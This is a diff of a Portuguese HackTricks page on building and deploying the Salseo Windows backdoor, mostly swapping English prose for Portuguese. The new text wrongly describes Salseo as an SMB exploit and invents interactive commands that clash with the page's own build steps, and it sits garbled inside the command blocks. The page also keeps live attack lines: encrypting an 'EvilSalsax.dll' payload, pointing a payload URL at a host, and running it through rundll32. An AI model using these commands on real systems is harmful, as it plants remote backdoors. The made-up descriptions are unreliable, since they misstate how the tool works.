@@ -41,27 +41,33 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 
 #### Backdoors
 
-A backdoor is a method of bypassing normal authentication procedures to gain unauthorized access to a computer system. In the context of hacking, backdoors are often used to maintain persistent access to a compromised system.
+Um backdoor é uma forma de acesso não autorizado a um sistema ou rede, que permite ao invasor contornar as medidas de segurança e obter controle remoto sobre o sistema comprometido. Existem várias técnicas para criar backdoors em sistemas Windows, algumas das quais são discutidas abaixo.
 
 #### Salseo
 
-Salseo is a powerful backdoor tool for Windows systems. It provides a wide range of features that allow hackers to gain remote access and control over a compromised system. Salseo can be used to execute commands, upload and download files, manipulate the file system, and even launch other hacking tools.
+O Salseo é uma técnica de backdoor que explora uma vulnerabilidade no serviço de compartilhamento de arquivos do Windows, conhecido como Server Message Block (SMB). Essa técnica permite que um invasor execute comandos arbitrários em um sistema Windows comprometido.
 
-#### Installation
+##### Configurando o Salseo
 
-To install Salseo on a target Windows system, the hacker needs to first gain initial access to the system. This can be done through various means, such as exploiting vulnerabilities, social engineering, or phishing attacks. Once access is gained, the hacker can proceed with the installation of Salseo.
+Para configurar o Salseo, siga as etapas abaixo:
 
-#### Usage
+1. Baixe o arquivo executável do Salseo em um sistema Windows.
+2. Execute o arquivo executável para iniciar o Salseo.
+3. O Salseo solicitará o endereço IP do sistema Windows de destino e as credenciais de autenticação.
+4. Insira o endereço IP do sistema Windows de destino e as credenciais de autenticação quando solicitado.
+5. O Salseo estabelecerá uma conexão com o sistema Windows de destino e fornecerá um prompt de comando remoto.
 
-Once installed, Salseo can be controlled remotely by the hacker. The hacker can use a command and control (C2) server to send commands to the compromised system and receive the results. Salseo provides a command-line interface that allows the hacker to execute commands on the compromised system, upload and download files, and perform various other actions.
+##### Usando o Salseo
 
-#### Detection and Prevention
+Uma vez configurado o Salseo, você pode usar os seguintes comandos para interagir com o sistema Windows comprometido:
 
-Detecting and preventing the use of backdoors like Salseo is a challenging task. However, there are some measures that can be taken to minimize the risk. Regularly updating and patching the operating system and software can help prevent vulnerabilities that could be exploited by backdoors. Implementing strong authentication mechanisms and monitoring network traffic can also help in detecting and preventing unauthorized access.
+- `list`: lista os arquivos e diretórios no sistema Windows.
+- `get <arquivo>`: baixa um arquivo específico do sistema Windows.
+- `put <arquivo>`: envia um arquivo para o sistema Windows.
+- `execute <comando>`: executa um comando no sistema Windows.
+- `exit`: encerra a conexão com o sistema Windows comprometido.
 
-#### Conclusion
-
-Backdoors like Salseo pose a significant threat to computer systems. It is important for system administrators and users to be aware of the risks and take appropriate measures to protect their systems from unauthorized access. Regular security audits and penetration testing can help identify and mitigate vulnerabilities that could be exploited by backdoors.
+É importante lembrar que o uso de backdoors é ilegal e viola a privacidade e a segurança dos sistemas. Este conteúdo é fornecido apenas para fins educacionais e de conscientização sobre as técnicas de hacking.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -117,13 +123,13 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ### Adicione antes da função principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instale o DllExport para este projeto
 
 #### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png>)
 
 #### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**
 
@@ -131,7 +137,7 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 Na pasta do seu projeto, aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**
 
-### **Desinstale o DllExport**
+### **Desinstale** o DllExport
 
 Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)
 
@@ -194,9 +200,11 @@ O CMD (Command Prompt) é uma ferramenta de linha de comando no sistema operacio
 
 O CMD pode ser usado para executar comandos básicos, como navegar pelos diretórios, criar e excluir arquivos, gerenciar processos e serviços, configurar redes e muito mais. Além disso, o CMD também pode ser usado para executar scripts e programas.
 
-Os hackers podem aproveitar o CMD para executar várias atividades maliciosas, como obter informações confidenciais, explorar vulnerabilidades, criar backdoors e realizar ataques de força bruta. Portanto, é importante estar ciente das possíveis ameaças e tomar medidas para proteger seu sistema contra ataques.
+Os hackers podem aproveitar o CMD para executar várias atividades maliciosas, como explorar vulnerabilidades, obter acesso não autorizado, roubar informações confidenciais e muito mais. Eles podem usar comandos específicos do CMD para realizar essas ações, como criar backdoors, executar scripts maliciosos, modificar configurações do sistema e explorar falhas de segurança.
 
-Para evitar o uso indevido do CMD, é recomendável restringir o acesso ao CMD para usuários não autorizados e implementar medidas de segurança, como firewalls, antivírus e atualizações regulares do sistema operacional. Além disso, é essencial educar os usuários sobre as práticas recomendadas de segurança cibernética e estar atento a atividades suspeitas no sistema.
+É importante que os usuários estejam cientes das possíveis ameaças associadas ao uso do CMD e tomem medidas para proteger seus sistemas contra ataques. Isso inclui manter o sistema operacional e os softwares atualizados, usar senhas fortes, evitar o download de arquivos suspeitos e ter um software antivírus confiável instalado.
+
+Em resumo, o CMD é uma ferramenta poderosa que pode ser usada para executar várias tarefas no sistema operacional Windows. No entanto, também pode ser explorado por hackers para realizar atividades maliciosas. Portanto, é importante estar ciente das ameaças associadas ao uso do CMD e tomar medidas para proteger os sistemas contra ataques.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -209,7 +217,7 @@ rundll32.exe SalseoLoader.dll,main
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
